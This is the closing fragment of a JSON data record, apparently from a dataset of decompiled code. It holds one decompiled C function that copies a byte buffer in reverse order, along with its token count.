        "decompiled_code": "\nvoid fcn.0040ff87(int32_t param_1)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uchar *puVar2;\n    uint32_t uVar3;\n    uint32_t unaff_ESI;\n    \n    uVar3 = 0;\n    if (unaff_ESI != 0) {\n        puVar2 = in_EAX + -1 + unaff_ESI;\n        do {\n            puVar1 = uVar3 + param_1;\n            uVar3 = uVar3 + 1;\n            *puVar2 = *puVar1;\n            puVar2 = puVar2 + -1;\n        } while (uVar3 < unaff_ESI);\n    }\n    return;\n}\n",
        "token_count": 164
    }
}